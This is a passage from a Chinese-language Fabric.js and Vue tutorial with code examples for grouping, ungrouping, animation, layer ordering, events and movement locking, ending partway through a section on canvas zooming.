    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// 椭圆</span>
  <span class="hljs-keyword">const</span> ellipse = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Ellipse</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">rx</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">ry</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'#ddd'</span>,
    <span class="hljs-attr">originX</span>: <span class="hljs-string">'center'</span>, <span class="hljs-comment">// 旋转x轴：left, right, center</span>
    <span class="hljs-attr">originY</span>: <span class="hljs-string">'center'</span> <span class="hljs-comment">// 旋转y轴：top, bottom, center</span>
  })

  <span class="hljs-comment">// 文本</span>
  <span class="hljs-keyword">const</span> text = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(<span class="hljs-string">'Hello World'</span>, {
    <span class="hljs-attr">top</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">originX</span>: <span class="hljs-string">"center"</span>,
    <span class="hljs-attr">originY</span>: <span class="hljs-string">"center"</span>
  })

  <span class="hljs-comment">// 建组</span>
  <span class="hljs-keyword">const</span> group = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Group</span>([ellipse, text], {
    <span class="hljs-attr">top</span>: <span class="hljs-number">50</span>, <span class="hljs-comment">// 整组距离顶部100</span>
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// 整组距离左侧100</span>
    <span class="hljs-attr">angle</span>: -<span class="hljs-number">10</span>, <span class="hljs-comment">// 整组旋转-10deg</span>
  })

  <span class="hljs-comment">// 控制第一个元素（椭圆）</span>
  group.<span class="hljs-title function_">item</span>(<span class="hljs-number">0</span>).<span class="hljs-title function_">set</span>(<span class="hljs-string">'fill'</span>, <span class="hljs-string">'#ea5455'</span>)

  <span class="hljs-comment">// 控制第二个元素（文本）</span>
  group.<span class="hljs-title function_">item</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_">set</span>({
    <span class="hljs-attr">text</span>: <span class="hljs-string">'雷猴，世界'</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'#fff'</span>
  })

  canvas.<span class="hljs-title function_">add</span>(group)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-40">取消分组</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd27bc79dd314b30829cce862e3e7ecc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=EhWlcU%2BhPzllN8HcdjAW9MrSN84%3D" alt="041.gif" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"ungroup"</span>&gt;</span>取消组<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">let</span> canvas = <span class="hljs-literal">null</span>

<span class="hljs-comment">// 初始化</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// 椭圆</span>
  <span class="hljs-keyword">const</span> ellipse = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Ellipse</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">rx</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">ry</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'#ddd'</span>,
    <span class="hljs-attr">originX</span>: <span class="hljs-string">'center'</span>, <span class="hljs-comment">// 旋转x轴：left, right, center</span>
    <span class="hljs-attr">originY</span>: <span class="hljs-string">'center'</span> <span class="hljs-comment">// 旋转y轴：top, bottom, center</span>
  })

  <span class="hljs-comment">// 文本</span>
  <span class="hljs-keyword">const</span> text = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(<span class="hljs-string">'Hello World'</span>, {
    <span class="hljs-attr">top</span>: <span class="hljs-number">40</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">originX</span>: <span class="hljs-string">"center"</span>,
    <span class="hljs-attr">originY</span>: <span class="hljs-string">"center"</span>
  })

  <span class="hljs-comment">// 建组</span>
  <span class="hljs-keyword">const</span> group = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Group</span>([ellipse, text], {
    <span class="hljs-attr">top</span>: <span class="hljs-number">50</span>, <span class="hljs-comment">// 整组距离顶部100</span>
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// 整组距离左侧100</span>
    <span class="hljs-attr">angle</span>: -<span class="hljs-number">10</span>, <span class="hljs-comment">// 整组旋转-10deg</span>
  })

  canvas.<span class="hljs-title function_">add</span>(group)
}

<span class="hljs-comment">// 取消组</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">ungroup</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 判断当前有没有选中元素，如果没有就不执行任何操作</span>
  <span class="hljs-keyword">if</span> (!canvas.<span class="hljs-title function_">getActiveObject</span>()) {
    <span class="hljs-keyword">return</span>
  }

  <span class="hljs-comment">// 判断当前是否选中组，如果不是，就不执行任何操作</span>
  <span class="hljs-keyword">if</span> (canvas.<span class="hljs-title function_">getActiveObject</span>().<span class="hljs-property">type</span> !== <span class="hljs-string">'group'</span>) {
    <span class="hljs-keyword">return</span>
  }

  <span class="hljs-comment">// 先获取当前选中的对象，然后打散</span>
  canvas.<span class="hljs-title function_">getActiveObject</span>().<span class="hljs-title function_">toActiveSelection</span>()
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-41">动画</h2>
<h3 data-id="heading-42">绝对值动画</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/69131934df9f43c6b39d031a512a88dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=xcmFtx63DjTwqgLDho0BIqRrSuw%3D" alt="042.gif" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-comment">// 初始化</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">height</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'red'</span>
  })

  <span class="hljs-comment">// 设置矩形动画</span>
  rect.<span class="hljs-title function_">animate</span>(<span class="hljs-string">'angle'</span>, <span class="hljs-string">"-50"</span>, {
    <span class="hljs-attr">onChange</span>:canvas.<span class="hljs-property">renderAll</span>.<span class="hljs-title function_">bind</span>(canvas), <span class="hljs-comment">// 每次刷新的时候都会执行</span>
  })

  canvas.<span class="hljs-title function_">add</span>(rect)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>每个 <code>Fabric</code> 对象都有一个 <code>animate</code> 方法，该方法可以动画化该对象。</p>
<p>用法：<code>animate(动画属性, 动画的结束值, [画的详细信息])</code></p>
<p><strong>第一个参数</strong>是要设置动画的属性。</p>
<p><strong>第二个参数</strong>是动画的结束值。</p>
<p><strong>第三个参数</strong>是一个对象，包括:</p>
<pre><code class="hljs language-ts" lang="ts">{

   rom：允许指定可设置动画的属性的起始值（如果我们不希望使用当前值）。

   duration：默认为<span class="hljs-number">500</span>（ms）。可用于更改动画的持续时间。

   onComplete：在动画结束时调用的回调。

   easing：缓动功能。

}
</code></pre>
<h3 data-id="heading-43">相对值动画</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d917634fef71418fa7d6c757b1f58583~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=ZKtKlNRQRMCAC3GiJ5SbPXl0MAM%3D" alt="043.gif" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-comment">// 初始化</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)
  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">height</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'red'</span>
  })

  <span class="hljs-comment">// 请注意第二个参数：+=360</span>
  rect.<span class="hljs-title function_">animate</span>(<span class="hljs-string">'angle'</span>, <span class="hljs-string">'+=360'</span>, {
    <span class="hljs-attr">onChange</span>:canvas.<span class="hljs-property">renderAll</span>.<span class="hljs-title function_">bind</span>(canvas), <span class="hljs-comment">// 每次刷新的时候都会执行</span>
    <span class="hljs-attr">duration</span>: <span class="hljs-number">2000</span>, <span class="hljs-comment">// 执行时间</span>
    <span class="hljs-attr">easing</span>: fabric.<span class="hljs-property">util</span>.<span class="hljs-property">ease</span>.<span class="hljs-property">easeOutBounce</span>, <span class="hljs-comment">// 缓冲效果</span>
  })

  canvas.<span class="hljs-title function_">add</span>(rect)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><code>绝对值动画</code> 和 <code>相对值动画</code> 的用法是差不多的，只是 <strong>第二个参数</strong> 用法不同。</p>
<p><code>相对值动画</code> 是把 <code>animate</code> 改成带上<strong>运算符</strong>的值，这样就会在原基础上做计算。</p>
<h2 data-id="heading-44">设置图形层级</h2>
<ul>
<li>
<p><strong>Canvas对象层级操作方法</strong>：</p>
<ul>
<li><code>canvas.bringToFront(object)</code>: 将指定对象移到最前面。</li>
<li><code>canvas.sendToBack(object)</code>: 将指定对象移到最后面。</li>
<li><code>canvas.bringForward(object)</code>: 将指定对象向前移动一个层级。</li>
<li><code>canvas.sendBackwards(object)</code>: 将指定对象向后移动一个层级。</li>
<li><code>canvas.moveTo(object, index)</code>: 将指定对象移动到指定的层级索引。</li>
</ul>
</li>
<li>
<p><strong>Object对象层级操作方法</strong>：</p>
<ul>
<li><code>object.bringToFront()</code>: 将当前对象移到最前面。</li>
<li><code>object.sendToBack()</code>: 将当前对象移到最后面。</li>
<li><code>object.bringForward(intersecting)</code>: 将当前对象向前移动一个层级，若<code>intersecting</code>为true则会跳过所有交叉的对象。</li>
<li><code>object.sendBackwards(intersecting)</code>: 将当前对象向后移动一个层级，若<code>intersecting</code>为true则会跳过所有交叉的对象。</li>
<li><code>object.moveTo(index)</code>: 将当前对象移动到指定的层级索引。</li>
</ul>
</li>
</ul>
<p>想要获取具体图形的层级一般使用 <strong>canvas.getObjects().indexOf(xxx)</strong> 。</p>
<p>显然，这个有点麻烦，我们自己加一个 level 方法让其直接显示对象的层级。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 新增 level 方法</span>
fabric.<span class="hljs-property">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">getLevel</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-title function_">getObjects</span>().<span class="hljs-title function_">indexOf</span>(<span class="hljs-variable language_">this</span>);
}
<span class="hljs-comment">// 添加到画布</span>
canvas.<span class="hljs-title function_">add</span>(rect, circle, triangle);
<span class="hljs-comment">// 调用level方法</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(rect.<span class="hljs-title function_">getLevel</span>()); <span class="hljs-comment">// 0</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(triangle.<span class="hljs-title function_">getLevel</span>()); <span class="hljs-comment">// 1</span>
</code></pre>
<h2 data-id="heading-45">事件</h2>
<p><code>Fabric.js</code> 提供了一套很方便的事件系统，可以用 <code>on</code> 方法可以初始化事件监听器，用 <code>off</code> 方法将其删除。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/16b213fc2d534f2da65e140800c5869d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=vlKtlmzhV4T6%2F3LEjirM4Qwbv3k%3D" alt="045.gif" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"addClickEvent"</span>&gt;</span>添加画布点击事件<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"removeClickEvent"</span>&gt;</span>移除画布点击事件<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">let</span> canvas = <span class="hljs-literal">null</span>

<span class="hljs-comment">// 初始化画布</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">height</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'#9896f1'</span>
  })

  <span class="hljs-comment">// 给矩形添加一个选中事件</span>
  rect.<span class="hljs-title function_">on</span>(<span class="hljs-string">'selected'</span>, <span class="hljs-function"><span class="hljs-params">options</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'选中矩形啦'</span>, options)
  })
  canvas.<span class="hljs-title function_">add</span>(rect)

  <span class="hljs-title function_">addClickEvent</span>()
}

<span class="hljs-comment">// 移除画布点击事件</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">removeClickEvent</span>(<span class="hljs-params"/>) {
  canvas.<span class="hljs-title function_">off</span>(<span class="hljs-string">'mouse:down'</span>)
}

<span class="hljs-comment">// 添加画布点击事件</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">addClickEvent</span>(<span class="hljs-params"/>) {
  <span class="hljs-title function_">removeClickEvent</span>() <span class="hljs-comment">// 在添加事件之前先把该事件清除掉，以免重复添加</span>
  canvas.<span class="hljs-title function_">on</span>(<span class="hljs-string">'mouse:down'</span>, <span class="hljs-function"><span class="hljs-params">options</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`x轴坐标: <span class="hljs-subst">${options.e.clientX}</span>;    y轴坐标: <span class="hljs-subst">${options.e.clientY}</span>`</span>)
  })
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-46">禁止操作框的部分功能</h2>
<h3 data-id="heading-47">禁止水平移动</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3506969d0418476bab5731bc2f370d1c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=OO0dpUJyvlkMSF%2FHz799z4HvQjY%3D" alt="047.gif" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-comment">// 初始化画布</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">height</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'#ffde7d'</span>
  })

  <span class="hljs-comment">// 不允许水平移动</span>
  rect.<span class="hljs-property">lockMovementX</span> = <span class="hljs-literal">true</span>

  canvas.<span class="hljs-title function_">add</span>(rect)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-48">禁止垂直移动</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e83327b48c342f0a1a215ad38f63a7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=VL9iM6Py0yxazvdoN9cIo1TPz28%3D" alt="048.gif" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-comment">// 初始化画布</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">height</span>: <span class="hljs-number">50</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'#f6416c'</span>
  })

  <span class="hljs-comment">// 不允许垂直移动</span>
  rect.<span class="hljs-property">lockMovementY</span> = <span class="hljs-literal">true</span>

  canvas.<span class="hljs-title function_">add</span>(rect)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-49">缩放和平移画布</h2>
<h3 data-id="heading-50">缩放画布</h3>
<h4 data-id="heading-51">以原点为基准缩放画布</h4>
<p>需要监听鼠标的滚轮事件：<code>mouse:wheel</code>。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ac81a86a671486ba52b8d2fd21195bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=CLwIJ8anp275rgPkiFt565DIYIo%3D" alt="052.gif" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
